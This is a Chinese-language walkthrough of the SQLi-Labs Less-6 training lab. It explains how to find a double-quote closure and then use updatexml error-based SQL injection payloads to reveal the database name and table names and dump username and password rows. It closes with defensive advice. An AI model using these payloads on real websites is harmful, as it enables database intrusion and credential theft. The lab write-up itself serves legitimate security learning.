## 一、题目信息
- 平台：SQLi-Labs
- 分类：Web - SQL Injection
- 难度：中等
- 通关标识：发现双引号闭合方式，在无回显的情况下利用 updatexml 报错注入带出数据。

## 二、大白话原理讲解
这一关和上一关（Less-5）是双胞胎。柜员（数据库）依然很“抠门”，不给你看打印结果，你只能靠故意让他“疼”得报错，把数据喊出来。

唯一的区别是：上一次柜员的锁孔是单引号（`'`）形状的，这一次他换成了**双引号（`"`）**形状。你只要把上一关的万能钥匙（Payload）里的单引号全部换成双引号，就能顺利捅开这把锁。

## 三、解题步骤

**1. 测试注入点并观察报错**
输入 `?id=1"`，页面报错：
`You have an error in your SQL syntax; ... right syntax to use near '"1"" LIMIT 0,1' at line 1`
**分析**：观察 `near` 后面的 `"1""`，**没有括号**。说明后台 SQL 语句是 `SELECT * FROM users WHERE id = "$id" LIMIT 0,1`。闭合方式为纯双引号 `"`。

**2. 尝试报错注入（爆库）**
直接使用 `updatexml` 函数测试双引号闭合：
```sql
?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+
```
**结论**：页面报错 `XPATH syntax error: '~security~'`。成功确认双引号闭合有效，并爆出当前库名 `security`。

**3. 逐行爆表名（带长度限制）**
同样因为报错回显有长度限制，用 `limit` 逐行查：
```sql
?id=1" and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1) --+
```
（将 `limit 0,1` 依次修改为 `limit 1,1`、`limit 2,1`，直到报错里出现 `~users~`）

**4. 终极拖库（拿账号密码）**
查第一行用户数据：
```sql
?id=1" and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) --+
```
**验证结果**：
页面回显 `XPATH syntax error: '~Dumb:Dumb~'`，成功拿到第一行账号密码。通关。

## 四、知识点解析
1. **闭合符的灵活变化**：SQL 语句中变量可能被单引号、双引号、甚至括号包裹，测出准确的闭合符是成功注入的第一步。
2. **报错注入的通用性**：无论是单引号还是双引号，只要页面能抛出 SQL 语法错误（没有关闭错误回显），`updatexml` 和 `extractvalue` 的注入逻辑完全一致。
3. **limit 的运用**：在报错回显长度受限、且不能用 `group_concat` 一次性打包时，`limit m,n` 是逐行获取数据的核心方法。

## 五、总结与防御
**本题总结**：
Less-6 就是 Less-5 的“双引号版本”。核心逻辑依然是依靠 `updatexml` 触发 XPath 报错。只要找准闭合符（本次为 `"`），后续的 Payload 照搬即可。

**安全防御建议**：
- **关闭详细报错**：在生产环境中务必关闭 `display_errors` 和数据库的详细报错，防止攻击者利用报错信息进行注入。
- **预编译语句（PDO/MySQLi）**：使用参数化查询，是彻底防御 SQL 注入最有效的手段。
